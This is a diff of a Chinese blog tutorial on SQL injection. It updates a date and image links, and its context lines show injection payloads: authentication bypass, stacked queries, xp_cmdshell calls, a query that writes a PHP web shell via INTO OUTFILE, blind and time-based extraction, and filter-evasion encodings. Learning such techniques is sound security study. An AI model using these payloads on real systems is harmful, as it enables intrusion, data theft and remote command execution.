@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-06-27
+                    2024-07-27
                 </div>
                 
 
@@ -462,9 +462,9 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="SQL注入学习"><a href="#SQL注入学习" class="headerlink" title="SQL注入学习"></a>SQL注入学习</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="数据库与web交互"><a href="#数据库与web交互" class="headerlink" title="数据库与web交互"></a>数据库与web交互</h3><p>数据库驱动的Web应用通常包含三层：表示层、逻辑层和存储层</p>
-<p><img src="https://z3.ax1x.com/2021/04/21/cbHpa4.png" alt="cbHpa4.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/bd917bb464f4ecc0a70931647924489c.png"></p>
 <p>Web浏览器（表示层）向中间层（逻辑层）发送请求，后者依次调用由位于应用层 的应用服务器提供的API，应用层通过查询、更新数据库（存储层）来响应该请求。</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJgYwQ.png" alt="WJgYwQ.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/fb4fe488ca6064bb837f649984e43f12.png"></p>
 <h3 id="SQL注入的产生过程"><a href="#SQL注入的产生过程" class="headerlink" title="SQL注入的产生过程"></a><strong>SQL</strong>注入的产生过程</h3><h4 id="构造动态字符串"><a href="#构造动态字符串" class="headerlink" title="构造动态字符串"></a>构造动态字符串</h4><p>简单来说就是将得到参数拼接到查询语句，然后执行，下列不当将会导致SQL注入</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">TABLE</span> <span class="token keyword">WHERE</span> FIELD <span class="token operator">=</span> <span class="token string">'input'</span>
 
@@ -540,7 +540,7 @@ http:<span class="token comment">//www.victim.com/showproducts.php?category=bi'+
 http:<span class="token comment">//www.victim.com/showproducts.php?category=bikes</span>
 http:<span class="token comment">//www.victim.com/showproducts.php?category=bi''kes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h5 id="信息工作流"><a href="#信息工作流" class="headerlink" title="信息工作流"></a>信息工作流</h5><p><img src="https://z3.ax1x.com/2021/07/19/WJ2Fts.png" alt="WJ2Fts.png"></p>
+<h5 id="信息工作流"><a href="#信息工作流" class="headerlink" title="信息工作流"></a>信息工作流</h5><p><img src="https://images.dadream.eu.org/images/2024/07/264b07c0f1804dc008b15f081b391718.png"></p>
 <h4 id="数据库错误"><a href="#数据库错误" class="headerlink" title="数据库错误"></a>数据库错误</h4><p>就是上文提到的报错</p>
 <h5 id="常见的sql漏洞"><a href="#常见的sql漏洞" class="headerlink" title="常见的sql漏洞"></a>常见的sql漏洞</h5><h6 id="Sql-Server错误"><a href="#Sql-Server错误" class="headerlink" title="Sql Server错误"></a>Sql Server错误</h6><p>假设在victim.com应用中找到了一个名为showproducts.php的页面，页面脚本接收名为id 的参数并根据id参数的值显示单个商品：</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproduct.aspx?id=2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -768,7 +768,7 @@ http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=2</s
 
 <h4 id="内联SQL注入"><a href="#内联SQL注入" class="headerlink" title="内联SQL注入"></a>内联SQL注入</h4><p>内联注入是指向查询注入一些SQL代码后，原来的代码仍然会全部执行</p>
 <h5 id="字符串内联注入"><a href="#字符串内联注入" class="headerlink" title="字符串内联注入"></a>字符串内联注入</h5><p>实例——用户提交用户和口令发送到数据库查询对用户进行验证</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJ2Jc6.png" alt="WJ2Jc6.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/890687249876e3832a2b2b96b5398fe6.png"></p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">查询语句
 <span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'$uname'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
@@ -782,7 +782,7 @@ http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=2</s
 <p>所以改变payload<code>' or 1=1 or '1'='1</code> </p>
 <p>当只允许返回一行时，指定返回admin <code>'admin' and 1=1 or '1'='1</code></p>
 <p>在passwd字段注入，<code>'or '1'='1</code>返回所有行</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJ2wAH.png" alt="WJ2wAH.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/6fd62d2c5717e94dd7bcba0e4342e9d9.png"></p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users
 <span class="token keyword">SET</span> password <span class="token operator">=</span> <span class="token string">'new_password'</span>
 <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'Bob'</span> <span class="token operator">and</span> password <span class="token operator">=</span> <span class="token string">'old_password'</span> <span class="token operator">OR</span> <span class="token string">'1'</span><span class="token operator">=</span> <span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -795,10 +795,10 @@ http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=2</s
 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> received<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>少了引号的闭合，更简单了，直接构造永真返回全部<code>num or 1=1</code></p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJ26jf.png" alt="WJ26jf.png"></p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJ2RHg.png" alt="WJ2RHg.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/8fd1fb2d04843d8266fc16528242a2fe.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/51d72d1c3f1546657dce86675b9594ed.png"></p>
 <h4 id="终止式SQL注入"><a href="#终止式SQL注入" class="headerlink" title="终止式SQL注入"></a>终止式SQL注入</h4><p>攻击者在SQL注入代码时，通过注释掉剩余部分查询语句，从而结束原来的查询语句</p>
-<h5 id="数据库注释语法"><a href="#数据库注释语法" class="headerlink" title="数据库注释语法"></a>数据库注释语法</h5><p><img src="https://z3.ax1x.com/2021/07/19/WJ2LbF.png" alt="WJ2LbF.png"></p>
+<h5 id="数据库注释语法"><a href="#数据库注释语法" class="headerlink" title="数据库注释语法"></a>数据库注释语法</h5><p><img src="https://images.dadream.eu.org/images/2024/07/81720d0d80330ebb159aadb6ca6c3bd2.png"></p>
 <p><code>/* */</code>可以用来绕过过滤空格</p>
 <p><code>1 or 1=1 </code>过滤空格变成<code>1or1=1</code></p>
 <p><code>/* */</code>绕过 <code>1/**/or/**/1=1</code></p>
@@ -815,9 +815,9 @@ http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=2</s
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span class="token string">' AND passwd = '</span><span class="token operator">/</span><span class="token operator">*</span><span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>注释后剩一对单引号，连接形成空字符串，对查询无影响</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJRS81.png" alt="WJRS81.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/d88c49974a29200155cf33378156e89b.png"></p>
 <p>可以用来判断数据库类型</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJR9v6.png" alt="WJR9v6.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/a87270ed8be250f52c67e92a08d774e1.png"></p>
 <h5 id="执行多条语句"><a href="#执行多条语句" class="headerlink" title="执行多条语句"></a>执行多条语句</h5><p>还有另一个名字，堆叠注入，终止了一条语句，可以创建一条全新的没有限制的语句，简单说就是将原始语句结束，在后面加几条新语句</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a <span class="token keyword">from</span> q<span class="token punctuation">;</span><span class="token keyword">select</span> b <span class="token keyword">from</span> w<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -834,7 +834,7 @@ http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=2</s
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">'&lt;?php echo shell_exec($_GET["cmd"]);?&gt;'</span>
 <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/var/www/victim.com/shell.php'</span><span class="token punctuation">;</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://z3.ax1x.com/2021/07/19/WJRiDO.png" alt="WJRiDO.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/3a91874d8bb2d2ad880d89fdd1f51473.png"></p>
 <h4 id="时间延迟"><a href="#时间延迟" class="headerlink" title="时间延迟"></a>时间延迟</h4><p>没有回显和报错信息被隐藏的时候，可以向数据库注入时间延迟，数据库返回的时间反映在web页面，用来确定是否有SQL注入</p>
 <p>mssql内置的设置延迟的命令<code>waitfor delay 'hours:minutes:seconds'</code></p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">waitfor</span> delay <span class="token string">'0:0:5'</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1343,16 +1343,16 @@ quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <p>使用下列SQL语句来获取PL/SQL代码的源</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> owner <span class="token keyword">AS</span> Owner<span class="token punctuation">,</span> name <span class="token keyword">AS</span> Name<span class="token punctuation">,</span> <span class="token keyword">type</span> <span class="token keyword">AS</span> <span class="token keyword">Type</span><span class="token punctuation">,</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">WHERE</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>LOWER<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">LIKE</span> <span class="token string">'%immediate%'</span><span class="token punctuation">)</span> <span class="token operator">OR</span> <span class="token punctuation">(</span>LOWER<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">LIKE</span> <span class="token string">'%dbms_sql'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">AND</span> owner<span class="token operator">=</span> <span class="token string">'PLSQL'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://z3.ax1x.com/2021/07/19/WJRMKf.png" alt="WJRMKf.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/840f9086a329bf41df56550583bdcb36.png"></p>
 <p>这三条语句易受到攻击，未验证的参数传给了危险的函数</p>
 <p>寻找参数复制给局部定义的变量</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> owner <span class="token keyword">AS</span> Owner<span class="token punctuation">,</span> name <span class="token keyword">AS</span> Name<span class="token punctuation">,</span> <span class="token keyword">type</span> <span class="token keyword">AS</span> <span class="token keyword">Type</span><span class="token punctuation">,</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">where</span> lower<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%:=%||%''%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://z3.ax1x.com/2021/07/19/WJRN2q.png" alt="WJRN2q.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/d4fd03c14a6b885f11cfe09069f46727.png"></p>
 <p>上述SQL语句找到了一个利用用户控制的数据动态创建SQL语句的包。我们有必要对该包做进一步审查，可以使用下列SQL语句追溯包(package)的源以便进一步审查其内容</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">WHERE</span> name<span class="token operator">=</span><span class="token string">'SP_STORED_PROCEDURE'</span> <span class="token operator">AND</span> owner<span class="token operator">=</span><span class="token string">'SYSMAN'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> line<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://z3.ax1x.com/2021/07/19/WJR0qU.png" alt="WJR0qU.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/268e43e5f0121d8c4c2fc627816da7d0.png"></p>
 <p>input直接与SQL字符串相连，可以判断存在SQL注入</p>
 <p>搜索数据库中所有的代码</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Purpose: A PL/SQL script to search the DB for potentially vulnerable </span>
@@ -1493,7 +1493,7 @@ mysql_db_query <span class="token operator">=</span> <span class="token number">
 
 <h4 id="OWASP-LAPSE-项目"><a href="#OWASP-LAPSE-项目" class="headerlink" title="OWASP LAPSE+项目"></a>OWASP LAPSE+项目</h4><h4 id="Microsoft-SQL注入源代码分析器"><a href="#Microsoft-SQL注入源代码分析器" class="headerlink" title="Microsoft SQL注入源代码分析器"></a>Microsoft SQL注入源代码分析器</h4><h4 id="CAT-NET"><a href="#CAT-NET" class="headerlink" title="CAT.NET"></a>CAT.NET</h4><h4 id="RIPS——PHP脚本漏洞的静态源代码分析器"><a href="#RIPS——PHP脚本漏洞的静态源代码分析器" class="headerlink" title="RIPS——PHP脚本漏洞的静态源代码分析器"></a>RIPS——PHP脚本漏洞的静态源代码分析器</h4><h4 id="CodePro-AnalytiX"><a href="#CodePro-AnalytiX" class="headerlink" title="CodePro AnalytiX"></a>CodePro AnalytiX</h4><h4 id="Teachable-Static-Analysis-Workbench"><a href="#Teachable-Static-Analysis-Workbench" class="headerlink" title="Teachable Static Analysis Workbench"></a>Teachable Static Analysis Workbench</h4><h4 id="商业源代码复查工具"><a href="#商业源代码复查工具" class="headerlink" title="商业源代码复查工具"></a>商业源代码复查工具</h4><h4 id="Fortify源代码分析器"><a href="#Fortify源代码分析器" class="headerlink" title="Fortify源代码分析器"></a>Fortify源代码分析器</h4><h4 id="Rational-AppScan-Source-Edition"><a href="#Rational-AppScan-Source-Edition" class="headerlink" title="Rational AppScan Source Edition"></a>Rational AppScan Source Edition</h4><h4 id="CodeSecure"><a href="#CodeSecure" class="headerlink" title="CodeSecure"></a>CodeSecure</h4><h4 id="Klocwork-Solo"><a href="#Klocwork-Solo" class="headerlink" title="Klocwork Solo"></a>Klocwork Solo</h4><h2 id="利用SQL注入"><a href="#利用SQL注入" class="headerlink" title="利用SQL注入"></a>利用SQL注入</h2><h3 id="常见的漏洞利用技术"><a href="#常见的漏洞利用技术" class="headerlink" title="常见的漏洞利用技术"></a>常见的漏洞利用技术</h3><p>本章大多用这个示例</p>
 <p><a target="_blank" rel="noopener" href="http://sql/Less-2/?id=1">http://sql/Less-2/?id=1</a></p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJRcGR.png" alt="WJRcGR.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/dd9f49a480d63d71849c61af3a1bb103.png"></p>
 <h4 id="使用堆叠注入"><a href="#使用堆叠注入" class="headerlink" title="使用堆叠注入"></a>使用堆叠注入</h4><p>堆叠查询（stacked query）指的是在单个数据库连接中执行多个查询序列，使用不同的数据库和不同的web框架，对堆叠查询支持情况也不同，使用ASP.NET和PHP访问Microsoft SQL Server时允许堆叠查询，但如果使用Java来访问，就不允许。使用PHP访问PostgreSQL时， PHP允许堆叠查询，但如果访问MySQL, PHP不允许堆叠查询。</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp=id=l;exec+master..xp_cmdshell+'dir'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -1585,9 +1585,9 @@ nvarchar <span class="token keyword">value</span> <span class="token string">'Mi
 
 <h4 id="盲追踪"><a href="#盲追踪" class="headerlink" title="盲追踪"></a>盲追踪</h4><p>应用不会返回信息时，利用不同数据库使用SQL语法不同产生的差异来判断数据库类型。</p>
 <h5 id="连接字符串的方式"><a href="#连接字符串的方式" class="headerlink" title="连接字符串的方式"></a>连接字符串的方式</h5><p>用不同的支付串连接方式注入，通过原始请求返回结果对比，若相同，则为对应数据库。</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJRXsf.png" alt="WJRXsf.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/db5df62ba1c448f7b78f246d43b03ad3.png"></p>
 <h5 id="数字函数"><a href="#数字函数" class="headerlink" title="数字函数"></a>数字函数</h5><p>相当于不同数据库的特征值，原理和前面相似</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJWkQ0.png" alt="WJWkQ0.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/87b6f9ee5436f469cb58fd426a00d7c1.png"></p>
 <p>例如，成功注入<code>WAITEOR DELAY</code>，表明数据库是mssql，成功注入<code>select pg_sleep(10)</code>，表明数据库是PostgreSQL</p>
 <p>Mysql精确确定版本</p>
 <p><code>/* !版本号 语句*/</code>若数据库版本号高于或等于！后面的，就会执行语句</p>
@@ -1608,7 +1608,7 @@ nvarchar <span class="token keyword">value</span> <span class="token string">'Mi
 <li>两个select对应列返回的数据类型是兼容的</li>
 </ul>
 <p>如果无法满足这两个条件就会查询失败并返回一个错误，下面是一些数据库返回的错误</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJWmo4.png" alt="WJWmo4.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/e78b0ba30b6e81959a8c7d560b34f51b.png"></p>
 <p>要得到正确的列数，两种方法</p>
 <ul>
 <li><p>每次增加列数，不断尝试</p>
@@ -1646,7 +1646,7 @@ http:<span class="token comment">//test/?id=12+union+select+NULL,NULL,NULL,'test
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12+union+select+NULL,concat(version(),0x7e,database()),NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>如果想要检索的不是字符串字，却只有支付串值的字段，可以使用强制转换为字符串</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJWD6P.png" alt="WJWD6P.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/2a1757616fa87006e38575c695c27afd.png"></p>
 <p>PostgreSQL允许使用<code>||</code>连接字符串，只要有一个变量是字符串即可作为字符串值</p>
 <h4 id="只返回一条结果"><a href="#只返回一条结果" class="headerlink" title="只返回一条结果"></a>只返回一条结果</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=12 union select NULL,username,password from users</span>
 <span class="token comment">-- 正常来说这条语句可以返回表中所有数据，但是有时只会返回一条数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -1658,7 +1658,7 @@ http:<span class="token comment">//test/?id=12+union+select+NULL,NULL,NULL,'test
 <span class="token comment">-- 加一个限制条件返回第二条数据，where也行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <h3 id="使用条件语句"><a href="#使用条件语句" class="headerlink" title="使用条件语句"></a>使用条件语句</h3><p>构建条件语句，条件语句的执行结果强迫服务器返回不同的结果，由结果的状态来判断条件是否为真</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJW560.png" alt="WJW560.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/ad493d6543d96db885d9a1428870d1ea.png"></p>
 <h4 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h4><p>基于Web应用响应时间上的差异，该时间取决于某些信息的值。</p>
 <h5 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">;</span>
 Microsoft <span class="token keyword">SQL</span> Server <span class="token number">2005</span> <span class="token operator">-</span> <span class="token number">9.00</span><span class="token number">.3042</span><span class="token number">.00</span> <span class="token punctuation">(</span>Intel X86<span class="token punctuation">)</span>
@@ -1673,7 +1673,7 @@ Standard Edition <span class="token keyword">on</span> Windows NT <span class="t
 <span class="token comment">-- 截取@@version的第25个字符是否为5，为5就是2005数据库，并且延迟返回</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>跑个脚本能把这一整段跑出来，精确判断，判断补丁，利用补丁攻击</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJWqk4.png" alt="WJWqk4.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/611e433cc3ffdeba5e68dcaaa0a90f0d.png"></p>
 <p><a target="_blank" rel="noopener" href="https://www.sqlteam.com/articles/sql-server-versions">SQL Server Version - SQLTeam.com</a></p>
 <p>如果有管理员权限，可以使用xp_cmdshell扩展储存过程来产生延迟，它通过加载一条需要花费特定秒数的命令来实现。</p>
 <p>启用xp_cmdshell</p>
@@ -2394,7 +2394,7 @@ pg_sleep<span class="token punctuation">(</span><span class="token punctuation">
 <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'Bob'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>我们可以看到，在其中注入了子查询，当然我们可以换成其他的漏洞代码</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJ4jpj.png" alt="WJ4jpj.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/1635b29c12fca4d4f03c3fa7f6557976.png"></p>
 <h4 id="常见的SQL盲注场景"><a href="#常见的SQL盲注场景" class="headerlink" title="常见的SQL盲注场景"></a>常见的SQL盲注场景</h4><p>1） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容可被适度控制的页面。这种情况通常出现在根据用户选择来显示信息的页面中。例如，用户点击一个包含id参数（能唯一识别数据库中的商品）的链接或者提交一个搜索请求。对于这两种情况，用户可控制页面提供的输出，因为该页面是根据用户提供的信息来生成的，比如提供一个产品的id，该页面还包含了从响应中获得的数据。</p>
 <p>因为页面提供了反馈信息（虽然不是以详细的数据库错误消息方式），所以可以使用基于时间的确认漏洞以及能够修改页面显示数据集的漏洞。例如，某个攻击可能会显示香皂或刷子的产品描述，以指示是否提取到了 0-bit或1-bit的数据。大多数情况下，只需提交一个单引号就足以破坏SQL查询平衡并强制产生一个通用的错误页面，这将有助于推断是否存在SQL注入漏洞。</p>
 <p>2） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容不可控的页面。当页面包含多个SQL查询，但只有第一个查询容易受到攻击且不产生输出时会碰到这种情况。还有一种场景也会引发这种情况：SQL注入位于 UPDATE或INSERT语句中，此时提交的信息虽然被写入数据库中且不产生输出，但却会产生通用的错误。</p>
@@ -2438,7 +2438,7 @@ Incubating<span class="token string">' and SUBSTRING ('</span>c4ca4238a0b923820d
 ('</span><span class="token number">0</span><span class="token string">','</span><span class="token number">1</span><span class="token string">','</span><span class="token number">2</span><span class="token string">','</span><span class="token number">3</span><span class="token string">','</span><span class="token number">4</span><span class="token string">','</span><span class="token number">5</span><span class="token string">','</span><span class="token number">6</span><span class="token string">','</span><span class="token number">7</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </li>
 <li><p>逐位方法</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJ5E9J.png" alt="WJ5E9J.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/304ab8debee5bb56e02a5703f7ad7fba.png"></p>
 <p>对每位（bit）进行比对</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Incubating<span class="token string">'
 AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp;
@@ -3253,8 +3253,8 @@ stristr<span class="token punctuation">(</span>$<span class="token keyword">valu
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/password%252f%252a*/FROM%252f%252a*/tblUsers%252f%252a*/WHERE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/'</span>admin'<span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>也能使用Unicode编码</p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJ5T29.png" alt="WJ5T29.png"></p>
-<p><img src="https://z3.ax1x.com/2021/07/19/WJ5v5D.png" alt="WJ5v5D.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/ada02281ca6c2ec5917209ee31ddf0fe.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/53fabfd7b23b29dcc9b7671b125d1d16.png"></p>
 <h4 id="使用动态查询执行"><a href="#使用动态查询执行" class="headerlink" title="使用动态查询执行"></a>使用动态查询执行</h4><p>过滤器阻止了想注入的查询，那么可以使用动态执行来避开该过滤器。</p>
 <ul>
 <li><p>mssql</p>
